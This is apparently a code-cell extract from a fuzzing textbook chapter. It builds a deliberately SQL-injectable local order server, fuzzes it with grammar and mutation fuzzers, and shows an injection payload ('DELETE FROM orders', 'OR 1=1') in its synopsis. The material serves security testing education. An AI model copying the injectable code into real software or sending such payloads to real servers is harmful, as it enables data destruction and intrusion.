["```py\nfrom [bookutils](https://github.com/uds-se/fuzzingbook//tree/master/notebooks/shared/bookutils) import YouTubeVideo\nYouTubeVideo('cgtpQ2KLZC8') \n```", "```py\n>>> from [fuzzingbook.WebFuzzer](WebFuzzer.html) import <identifier> \n```", "```py\n>>> web_form_fuzzer = WebFormFuzzer(httpd_url)\n>>> web_form_fuzzer.grammar['<start>']\n['<action>?<query>']\n>>> web_form_fuzzer.grammar['<action>']\n['/order']\n>>> web_form_fuzzer.grammar['<query>']\n['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>'] \n```", "```py\n>>> web_form_fuzzer.fuzz()\n'/order?item=lockset&name=%43+&email=+c%40_+c&city=%37b_4&zip=5&terms=on&submit=' \n```", "```py\n>>> sql_fuzzer = SQLInjectionFuzzer(httpd_url, \"DELETE FROM orders\")\n>>> sql_fuzzer.fuzz()\n\"/order?item=lockset&name=+&email=0%404&city=+'+)%3b+DELETE+FROM+orders%3b+--&zip='+OR+1%3d1--'&terms=on&submit=\" \n```", "```py\nfrom [http.server](https://docs.python.org/3/library/http.server.html) import HTTPServer, BaseHTTPRequestHandler\nfrom [http.server](https://docs.python.org/3/library/http.server.html) import HTTPStatus \n```", "```py\nclass SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n  \"\"\"A simple HTTP server\"\"\"\n    pass \n```", "```py\nimport [bookutils.setup](https://github.com/uds-se/fuzzingbook//tree/master/notebooks/shared/bookutils) \n```", "```py\nfrom [typing](https://docs.python.org/3/library/typing.html) import NoReturn, Tuple, Dict, List, Optional, Union \n```", "```py\nFUZZINGBOOK_SWAG = {\n    \"tshirt\": \"One FuzzingBook T-Shirt\",\n    \"drill\": \"One FuzzingBook Rotary Hammer\",\n    \"lockset\": \"One FuzzingBook Lock Set\"\n} \n```", "```py\nHTML_ORDER_FORM = \"\"\"\n<html><body>\n<form action=\"/order\" style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Swag Order Form</strong>\n <p>\n Yes! Please send me at your earliest convenience\n <select name=\"item\">\n \"\"\"\n# (We don't use h2, h3, etc. here\n# as they interfere with the notebook table of contents)\n\nfor item in FUZZINGBOOK_SWAG:\n    HTML_ORDER_FORM += \\\n        '<option value=\"{item}\">{name}</option>\\n'.format(item=item,\n            name=FUZZINGBOOK_SWAG[item])\n\nHTML_ORDER_FORM += \"\"\"\n </select>\n <br>\n <table>\n <tr><td>\n <label for=\"name\">Name: </label><input type=\"text\" name=\"name\">\n </td><td>\n <label for=\"email\">Email: </label><input type=\"email\" name=\"email\"><br>\n </td></tr>\n <tr><td>\n <label for=\"city\">City: </label><input type=\"text\" name=\"city\">\n </td><td>\n <label for=\"zip\">ZIP Code: </label><input type=\"number\" name=\"zip\">\n </tr></tr>\n </table>\n <input type=\"checkbox\" name=\"terms\"><label for=\"terms\">I have read\n the <a href=\"/terms\">terms and conditions</a></label>.<br>\n <input type=\"submit\" name=\"submit\" value=\"Place order\">\n</p>\n</form>\n</body></html>\n\"\"\" \n```", "```py\nfrom [IPython.display](https://ipython.readthedocs.io/en/stable/api/generated/IPython.display.html) import display \n```", "```py\nfrom [bookutils](https://github.com/uds-se/fuzzingbook//tree/master/notebooks/shared/bookutils) import HTML \n```", "```py\nHTML(HTML_ORDER_FORM) \n```", "```py\nHTML_ORDER_RECEIVED = \"\"\"\n<html><body>\n<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n <p id=\"confirmation\">\n We will send <strong>{item_name}</strong> to {name} in {city}, {zip}<br>\n A confirmation mail will be sent to {email}.\n </p>\n <p>\n Want more swag?  Use our <a href=\"/\">order form</a>!\n </p>\n</div>\n</body></html>\n\"\"\" \n```", "```py\nHTML(HTML_ORDER_RECEIVED.format(item_name=\"One FuzzingBook Rotary Hammer\",\n                                name=\"Jane Doe\",\n                                email=\"doe@example.com\",\n                                city=\"Seattle\",\n                                zip=\"98104\")) \n```", "```py\nHTML_TERMS_AND_CONDITIONS = \"\"\"\n<html><body>\n<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Terms and Conditions</strong>\n <p>\n The content of this project is licensed under the\n <a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/\">Creative Commons\n Attribution-NonCommercial-ShareAlike 4.0 International License.</a>\n </p>\n <p>\n To place an order, use our <a href=\"/\">order form</a>.\n </p>\n</div>\n</body></html>\n\"\"\" \n```", "```py\nHTML(HTML_TERMS_AND_CONDITIONS) \n```", "```py\nimport [sqlite3](https://docs.python.org/3/library/sqlite3.html)\nimport [os](https://docs.python.org/3/library/os.html) \n```", "```py\nORDERS_DB = \"orders.db\" \n```", "```py\ndef init_db():\n    if os.path.exists(ORDERS_DB):\n        os.remove(ORDERS_DB)\n\n    db_connection = sqlite3.connect(ORDERS_DB)\n    db_connection.execute(\"DROP TABLE IF EXISTS orders\")\n    db_connection.execute(\"CREATE TABLE orders \"\n                          \"(item text, name text, email text, \"\n                          \"city text, zip text)\")\n    db_connection.commit()\n\n    return db_connection \n```", "```py\ndb = init_db() \n```", "```py\nprint(db.execute(\"SELECT * FROM orders\").fetchall()) \n```", "```py\n[]\n\n```", "```py\ndb.execute(\"INSERT INTO orders \" +\n           \"VALUES ('lockset', 'Walter White', \"\n           \"'white@jpwynne.edu', 'Albuquerque', '87101')\")\ndb.commit() \n```", "```py\nprint(db.execute(\"SELECT * FROM orders\").fetchall()) \n```", "```py\n[('lockset', 'Walter White', 'white@jpwynne.edu', 'Albuquerque', '87101')]\n\n```", "```py\ndb.execute(\"DELETE FROM orders WHERE name = 'Walter White'\")\ndb.commit() \n```", "```py\nprint(db.execute(\"SELECT * FROM orders\").fetchall()) \n```", "```py\n[]\n\n```", "```py\nclass SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def do_GET(self):\n        try:\n            # print(\"GET \" + self.path)\n            if self.path == \"/\":\n                self.send_order_form()\n            elif self.path.startswith(\"/order\"):\n                self.handle_order()\n            elif self.path.startswith(\"/terms\"):\n                self.send_terms_and_conditions()\n            else:\n                self.not_found()\n        except Exception:\n            self.internal_server_error() \n```", "```py\nclass SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def send_order_form(self):\n        self.send_response(HTTPStatus.OK, \"Place your order\")\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(HTML_ORDER_FORM.encode(\"utf8\")) \n```", "```py\nclass SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def send_terms_and_conditions(self):\n        self.send_response(HTTPStatus.OK, \"Terms and Conditions\")\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(HTML_TERMS_AND_CONDITIONS.encode(\"utf8\")) \n```", "```py\n<hostname>/order?field_1=value_1&field_2=value_2&field_3=value_3\n```", "```py\n<hostname>/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104\n```", "```py\nimport [urllib.parse](https://docs.python.org/3/library/urllib.parse.html) \n```", "```py\nclass SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def get_field_values(self):\n        # Note: this fails to decode non-ASCII characters properly\n        query_string = urllib.parse.urlparse(self.path).query\n\n        # fields is { 'item': ['tshirt'], 'name': ['Jane Doe'], ...}\n        fields = urllib.parse.parse_qs(query_string, keep_blank_values=True)\n\n        values = {}\n        for key in fields:\n            values[key] = fields[key][0]\n\n        return values \n```", "```py\nclass SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def handle_order(self):\n        values = self.get_field_values()\n        self.store_order(values)\n        self.send_order_received(values) \n```", "```py\nclass SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def store_order(self, values):\n        db = sqlite3.connect(ORDERS_DB)\n        # The following should be one line\n        sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n        self.log_message(\"%s\", sql_command)\n        db.executescript(sql_command)\n        db.commit() \n```", "```py\nclass SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def send_order_received(self, values):\n        # Should use html.escape()\n        values[\"item_name\"] = FUZZINGBOOK_SWAG[values[\"item\"]]\n        confirmation = HTML_ORDER_RECEIVED.format(**values).encode(\"utf8\")\n\n        self.send_response(HTTPStatus.OK, \"Order received\")\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(confirmation) \n```", "```py\nclass SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def do_HEAD(self):\n        # print(\"HEAD \" + self.path)\n        self.send_response(HTTPStatus.OK)\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers() \n```", "```py\nHTML_NOT_FOUND = \"\"\"\n<html><body>\n<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n <strong id=\"title\" style=\"font-size: x-large\">Sorry.</strong>\n <p>\n This page does not exist.  Try our <a href=\"/\">order form</a> instead.\n </p>\n</div>\n</body></html>\n \"\"\" \n```", "```py\nHTML(HTML_NOT_FOUND) \n```", "```py\nclass SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def not_found(self):\n        self.send_response(HTTPStatus.NOT_FOUND, \"Not found\")\n\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n\n        message = HTML_NOT_FOUND\n        self.wfile.write(message.encode(\"utf8\")) \n```", "```py\nHTML_INTERNAL_SERVER_ERROR = \"\"\"\n<html><body>\n<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n <p>\n The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n <pre>{error_message}</pre>\n </p>\n</div>\n</body></html>\n \"\"\" \n```", "```py\nHTML(HTML_INTERNAL_SERVER_ERROR) \n```", "```py\n{error_message}\n```", "```py\nimport [sys](https://docs.python.org/3/library/sys.html)\nimport [traceback](https://docs.python.org/3/library/traceback.html) \n```", "```py\nclass SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def internal_server_error(self):\n        self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR, \"Internal Error\")\n\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n\n        exc = traceback.format_exc()\n        self.log_message(\"%s\", exc.strip())\n\n        message = HTML_INTERNAL_SERVER_ERROR.format(error_message=exc)\n        self.wfile.write(message.encode(\"utf8\")) \n```", "```py\nfrom [multiprocess](https://pypi.org/project/multiprocess/) import Queue \n```", "```py\nHTTPD_MESSAGE_QUEUE = Queue() \n```", "```py\nHTTPD_MESSAGE_QUEUE.put(\"I am another message\") \n```", "```py\nHTTPD_MESSAGE_QUEUE.put(\"I am one more message\") \n```", "```py\nfrom [bookutils](https://github.com/uds-se/fuzzingbook//tree/master/notebooks/shared/bookutils) import rich_output, terminal_escape \n```", "```py\ndef display_httpd_message(message: str) -> None:\n    if rich_output():\n        display(\n            HTML(\n                '<pre style=\"background: NavajoWhite;\">' +\n                message +\n                \"</pre>\"))\n    else:\n        print(terminal_escape(message)) \n```", "```py\ndisplay_httpd_message(\"I am a httpd server message\") \n```", "```py\nI am a httpd server message\n```", "```py\ndef print_httpd_messages():\n    while not HTTPD_MESSAGE_QUEUE.empty():\n        message = HTTPD_MESSAGE_QUEUE.get()\n        display_httpd_message(message) \n```", "```py\nimport [time](https://docs.python.org/3/library/time.html) \n```", "```py\ntime.sleep(1)\nprint_httpd_messages() \n```", "```py\nI am another message\n```", "```py\nI am one more message\n```", "```py\ndef clear_httpd_messages() -> None:\n    while not HTTPD_MESSAGE_QUEUE.empty():\n        HTTPD_MESSAGE_QUEUE.get() \n```", "```py\nclass SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def log_message(self, format: str, *args) -> None:\n        message = (\"%s - - [%s] %s\\n\" %\n                   (self.address_string(),\n                    self.log_date_time_string(),\n                    format % args))\n        HTTPD_MESSAGE_QUEUE.put(message) \n```", "```py\nimport [requests](http://docs.python-requests.org/en/master/) \n```", "```py\ndef webbrowser(url: str, mute: bool = False) -> str:\n  \"\"\"Download and return the http/https resource given by the URL\"\"\"\n\n    try:\n        r = requests.get(url)\n        contents = r.text\n    finally:\n        if not mute:\n            print_httpd_messages()\n        else:\n            clear_httpd_messages()\n\n    return contents \n```", "```py\ndef run_httpd_forever(handler_class: type) -> NoReturn:\n    host = \"127.0.0.1\"  # localhost IP\n    for port in range(8800, 9000):\n        httpd_address = (host, port)\n\n        try:\n            httpd = HTTPServer(httpd_address, handler_class)\n            break\n        except OSError:\n            continue\n\n    httpd_url = \"http://\" + host + \":\" + repr(port)\n    HTTPD_MESSAGE_QUEUE.put(httpd_url)\n    httpd.serve_forever() \n```", "```py\nfrom [multiprocess](https://pypi.org/project/multiprocess/) import Process \n```", "```py\ndef start_httpd(handler_class: type = SimpleHTTPRequestHandler) \\\n        -> Tuple[Process, str]:\n    clear_httpd_messages()\n\n    httpd_process = Process(target=run_httpd_forever, args=(handler_class,))\n    httpd_process.start()\n\n    httpd_url = HTTPD_MESSAGE_QUEUE.get()\n    return httpd_process, httpd_url \n```", "```py\nhttpd_process, httpd_url = start_httpd()\nhttpd_url \n```", "```py\n'http://127.0.0.1:8800'\n\n```", "```py\ndef print_url(url: str) -> None:\n    if rich_output():\n        display(HTML('<pre><a href=\"%s\">%s</a></pre>' % (url, url)))\n    else:\n        print(terminal_escape(url)) \n```", "```py\nprint_url(httpd_url) \n```", "```py\nhttp://127.0.0.1:8800\n```", "```py\nfrom [IPython.display](https://ipython.readthedocs.io/en/stable/api/generated/IPython.display.html) import IFrame \n```", "```py\nIFrame(httpd_url, '100%', 230) \n```", "```py\nprint_httpd_messages() \n```", "```py\nprint(db.execute(\"SELECT * FROM orders\").fetchall()) \n```", "```py\n[]\n\n```", "```py\ndb.execute(\"DELETE FROM orders\")\ndb.commit() \n```", "```py\ncontents = webbrowser(httpd_url) \n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:25] \"GET / HTTP/1.1\" 200 -\n\n```", "```py\nHTML(contents) \n```", "```py\nfrom [urllib.parse](https://docs.python.org/3/library/urllib.parse.html) import urljoin, urlsplit \n```", "```py\nurljoin(httpd_url, \"/order?foo=bar\") \n```", "```py\n'http://127.0.0.1:8800/order?foo=bar'\n\n```", "```py\ncontents = webbrowser(urljoin(httpd_url,\n                              \"/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104\")) \n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:25] INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:25] \"GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1\" 200 -\n\n```", "```py\nHTML(contents) \n```", "```py\nprint(db.execute(\"SELECT * FROM orders\").fetchall()) \n```", "```py\n[('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')]\n\n```", "```py\nHTML(webbrowser(urljoin(httpd_url, \"/some/other/path\"))) \n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:25] \"GET /some/other/path HTTP/1.1\" 404 -\n\n```", "```py\nimport [string](https://docs.python.org/3/library/string.html) \n```", "```py\ndef cgi_encode(s: str, do_not_encode: str = \"\") -> str:\n    ret = \"\"\n    for c in s:\n        if (c in string.ascii_letters or c in string.digits\n                or c in \"$-_.+!*'(),\" or c in do_not_encode):\n            ret += c\n        elif c == ' ':\n            ret += '+'\n        else:\n            ret += \"%%%02x\" % ord(c)\n    return ret \n```", "```py\ns = cgi_encode('Is \"DOW30\" down .24%?')\ns \n```", "```py\n'Is+%22DOW30%22+down+.24%25%3f'\n\n```", "```py\ncgi_encode(\"<string>@<string>\", \"<>\") \n```", "```py\n'<string>%40<string>'\n\n```", "```py\nfrom [Coverage](Coverage.html) import cgi_decode  # minor dependency \n```", "```py\ncgi_decode(s) \n```", "```py\n'Is \"DOW30\" down .24%?'\n\n```", "```py\nfrom [Grammars](Grammars.html) import crange, is_valid_grammar, syntax_diagram, Grammar \n```", "```py\nORDER_GRAMMAR: Grammar = {\n    \"<start>\": [\"<order>\"],\n    \"<order>\": [\"/order?item=<item>&name=<name>&email=<email>&city=<city>&zip=<zip>\"],\n    \"<item>\": [\"tshirt\", \"drill\", \"lockset\"],\n    \"<name>\": [cgi_encode(\"Jane Doe\"), cgi_encode(\"John Smith\")],\n    \"<email>\": [cgi_encode(\"j.doe@example.com\"), cgi_encode(\"j_smith@example.com\")],\n    \"<city>\": [\"Seattle\", cgi_encode(\"New York\")],\n    \"<zip>\": [\"<digit>\" * 5],\n    \"<digit>\": crange('0', '9')\n} \n```", "```py\nassert is_valid_grammar(ORDER_GRAMMAR) \n```", "```py\nsyntax_diagram(ORDER_GRAMMAR) \n```", "```py\nstart\n\n```", "```py\norder\n\n```", "```py\nitem\n\n```", "```py\nname\n\n```", "```py\nemail\n\n```", "```py\ncity\n\n```", "```py\nzip\n\n```", "```py\ndigit\n\n```", "```py\nfrom [GrammarFuzzer](GrammarFuzzer.html) import GrammarFuzzer \n```", "```py\norder_fuzzer = GrammarFuzzer(ORDER_GRAMMAR)\n[order_fuzzer.fuzz() for i in range(5)] \n```", "```py\n['/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=New+York&zip=42436',\n '/order?item=drill&name=John+Smith&email=j_smith%40example.com&city=New+York&zip=56213',\n '/order?item=drill&name=Jane+Doe&email=j_smith%40example.com&city=Seattle&zip=63628',\n '/order?item=drill&name=John+Smith&email=j.doe%40example.com&city=Seattle&zip=59538',\n '/order?item=drill&name=Jane+Doe&email=j_smith%40example.com&city=New+York&zip=41160']\n\n```", "```py\nHTML(webbrowser(urljoin(httpd_url, order_fuzzer.fuzz()))) \n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] INSERT INTO orders VALUES ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631')\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /order?item=lockset&name=Jane+Doe&email=j_smith%40example.com&city=Seattle&zip=16631 HTTP/1.1\" 200 -\n\n```", "```py\nprint(db.execute(\"SELECT * FROM orders\").fetchall()) \n```", "```py\n[('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104'), ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631')]\n\n```", "```py\nseed = order_fuzzer.fuzz()\nseed \n```", "```py\n'/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732'\n\n```", "```py\nfrom [MutationFuzzer](MutationFuzzer.html) import MutationFuzzer  # minor deoendency \n```", "```py\nmutate_order_fuzzer = MutationFuzzer([seed], min_mutations=1, max_mutations=1)\n[mutate_order_fuzzer.fuzz() for i in range(5)] \n```", "```py\n['/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732',\n '/order?item=drill&name=Jane+Doe&email=.doe%40example.com&city=Seattle&zip=45732',\n '/order?item=drill;&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732',\n '/order?item=drill&name=Jane+Doe&emil=j.doe%40example.com&city=Seattle&zip=45732',\n '/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=4732']\n\n```", "```py\nwhile True:\n    path = mutate_order_fuzzer.fuzz()\n    url = urljoin(httpd_url, path)\n    r = requests.get(url)\n    if r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:\n        break \n```", "```py\nurl \n```", "```py\n'http://127.0.0.1:8800/order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732'\n\n```", "```py\nclear_httpd_messages()\nHTML(webbrowser(url)) \n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732 HTTP/1.1\" 500 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py\", line 8, in do_GET\n    self.handle_order()\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py\", line 4, in handle_order\n    self.store_order(values)\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py\", line 5, in store_order\n    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nKeyError: 'name'\n\n```", "```py\nTraceback (most recent call last):\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py\", line 8, in do_GET\n    self.handle_order()\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py\", line 4, in handle_order\n    self.store_order(values)\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py\", line 5, in store_order\n    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nKeyError: 'name'\n\n```", "```py\nfailing_path = path\nfailing_path \n```", "```py\n'/order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732'\n\n```", "```py\nfrom [Fuzzer](Fuzzer.html) import Runner \n```", "```py\nclass WebRunner(Runner):\n  \"\"\"Runner for a Web server\"\"\"\n\n    def __init__(self, base_url: Optional[str] = None):\n        self.base_url = base_url\n\n    def run(self, url: str) -> Tuple[str, str]:\n        if self.base_url is not None:\n            url = urljoin(self.base_url, url)\n\n        import [requests](http://docs.python-requests.org/en/master/)  # for imports\n        r = requests.get(url)\n        if r.status_code == HTTPStatus.OK:\n            return url, Runner.PASS\n        elif r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:\n            return url, Runner.FAIL\n        else:\n            return url, Runner.UNRESOLVED \n```", "```py\nweb_runner = WebRunner(httpd_url)\nweb_runner.run(failing_path) \n```", "```py\n('http://127.0.0.1:8800/order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732',\n 'FAIL')\n\n```", "```py\nfrom [Reducer](Reducer.html) import DeltaDebuggingReducer  # minor \n```", "```py\nminimized_path = DeltaDebuggingReducer(web_runner).reduce(failing_path)\nminimized_path \n```", "```py\n'order'\n\n```", "```py\nminimized_url = urljoin(httpd_url, minimized_path)\nminimized_url \n```", "```py\n'http://127.0.0.1:8800/order'\n\n```", "```py\nclear_httpd_messages()\nHTML(webbrowser(minimized_url)) \n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /doe%40example.com&city=Seattle&zip=45732 HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /order?item=drill&nae=Jane+Doe&email=j. HTTP/1.1\" 500 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py\", line 8, in do_GET\n    self.handle_order()\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py\", line 4, in handle_order\n    self.store_order(values)\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py\", line 5, in store_order\n    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nKeyError: 'name'\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /ae=Jane+Doe&email=j. HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /order?item=drill&n HTTP/1.1\" 500 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py\", line 8, in do_GET\n    self.handle_order()\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py\", line 4, in handle_order\n    self.store_order(values)\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py\", line 5, in store_order\n    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nKeyError: 'name'\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /em=drill&n HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /order?it HTTP/1.1\" 500 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py\", line 8, in do_GET\n    self.handle_order()\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py\", line 4, in handle_order\n    self.store_order(values)\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py\", line 5, in store_order\n    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nKeyError: 'item'\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /er?it HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /ord HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /rder?it HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /oer?it HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /ord?it HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /order HTTP/1.1\" 500 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py\", line 8, in do_GET\n    self.handle_order()\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py\", line 4, in handle_order\n    self.store_order(values)\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py\", line 5, in store_order\n    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nKeyError: 'item'\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /rder HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /oer HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /order HTTP/1.1\" 500 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py\", line 8, in do_GET\n    self.handle_order()\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py\", line 4, in handle_order\n    self.store_order(values)\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py\", line 5, in store_order\n    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nKeyError: 'item'\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /oder HTTP/1.1\" 404 -\n\n```", 